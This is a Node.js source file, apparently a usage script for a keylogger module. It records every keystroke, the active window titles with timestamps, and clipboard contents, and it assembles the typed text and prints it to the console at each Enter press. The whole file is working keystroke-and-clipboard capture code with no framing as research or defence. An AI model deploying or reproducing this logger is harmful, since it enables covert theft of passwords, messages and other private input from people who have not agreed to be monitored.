const keylogger = require("./src/index");

// Special key mappings
const specialKeys = {
    'Shift': '[Shift]',
    'Control': '[Ctrl]',
    'Alt': '[Alt]',
    'Meta': '[Win]',
    'Enter': '[Enter]',
    'Backspace': '[Backspace]',
    'Tab': '[Tab]',
    'Escape': '[Esc]',
    'Spacebar': ' ',
    'ArrowLeft': '[←]',
    'ArrowRight': '[→]',
    'ArrowUp': '[↑]',
    'ArrowDown': '[↓]',
    'Delete': '[Del]',
    'Insert': '[Ins]',
    'Home': '[Home]',
    'End': '[End]',
    'PageUp': '[PgUp]',
    'PageDown': '[PgDn]',
    'CapsLock': '[Caps]',
    'PrintScreen': '[PrtSc]'
};

let currentText = '';
let currentWindow = '';
let isShiftPressed = false;
let isCtrlPressed = false;
let isAltPressed = false;
let specialKeyStates = {};

// Function to clean window title
function cleanWindowTitle(title) {
    // Remove common prefixes/suffixes
    title = title.replace(/^[*?] /, ''); // Remove leading * or ?
    title = title.replace(/[*?]$/, ''); // Remove trailing * or ?
    
    // If the title contains " - ", it's likely a parent-child window title
    // We want to keep both parts
    if (title.includes(" - ")) {
        return title;
    }
    
    return title.trim();
}

// Function to format window header
function formatWindowHeader(windowTitle) {
    const now = new Date();
    const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const cleanTitle = cleanWindowTitle(windowTitle);
    const separator = '-'.repeat(80);
    return `${separator}\n[${time} - ${cleanTitle}]\n${separator}`;
}

keylogger.start((key, isKeyUp, keyCode, windowTitle, clipboardData) => {
    // Handle window changes
    const cleanedWindowTitle = cleanWindowTitle(windowTitle);
    if (currentWindow !== cleanedWindowTitle) {
        if (currentText) {
            console.log(currentText);
        }
        currentWindow = cleanedWindowTitle;
        currentText = '';
        console.log(formatWindowHeader(windowTitle));
    }

    // Handle clipboard data
    if (clipboardData) {
        console.log(`[Clipboard Data]${clipboardData}`);
    }

    // Handle modifier keys state
    if (key === 'Shift') isShiftPressed = !isKeyUp;
    if (key === 'Control') isCtrlPressed = !isKeyUp;
    if (key === 'Alt') isAltPressed = !isKeyUp;

    // Handle special keys (only on key down)
    if (specialKeys[key] && !isKeyUp && !specialKeyStates[key]) {
        specialKeyStates[key] = true;
        currentText += specialKeys[key];
    }
    // Reset special key state on key up
    else if (specialKeys[key] && isKeyUp) {
        specialKeyStates[key] = false;
    }
    // Handle regular characters (only on key down)
    else if (!isKeyUp) {
        // Handle shift-modified characters
        if (isShiftPressed) {
            currentText += key.toUpperCase();
        } else {
            currentText += key.toLowerCase();
        }
    }
    // Handle function keys (only on key down)
    else if (key.startsWith('F') && !isKeyUp && !specialKeyStates[key]) {
        specialKeyStates[key] = true;
        currentText += `[${key}]`;
    }
    else if (key.startsWith('F') && isKeyUp) {
        specialKeyStates[key] = false;
    }

    // Print current text when Enter is pressed
    if (key === 'Enter' && !isKeyUp) {
        console.log(currentText);
        currentText = '';
    }
});

// Print the final text when stopping
setTimeout(() => {
    if (currentText) {
        console.log(currentText);
    }
    keylogger.stop();
}, 500000);